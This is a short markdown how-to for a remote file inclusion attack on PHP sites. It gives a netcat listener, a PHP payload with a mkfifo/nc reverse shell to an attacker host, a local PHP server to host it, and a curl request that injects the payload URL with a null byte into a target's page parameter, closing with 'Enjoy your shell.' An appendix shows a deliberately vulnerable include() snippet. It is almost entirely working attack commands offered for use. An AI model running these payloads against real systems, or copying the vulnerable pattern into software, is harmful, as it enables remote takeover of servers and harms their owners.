# RFI

Documentation on remote file inclusion attack.

Start netcat handler.

```sh
nc -lnvp 4444
```

Create file evil.txt with this reverse_tcp.

```sh
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxxxxx 4444 >/tmp/f");?> 
```

Start php server.

```sh
php -S 0.0.0.0:8000
```

Trigger RFI

```sh
curl -s https://server-ip/section.php?page=http://your-ip:8000/evil.txt%00
```

Enjoy your shell.

## Appendix

This is a snippet on how vulnerable could look like. 

```php
<?php
   $page = $_GET["page"];
   include($page . '.php');
?>
```
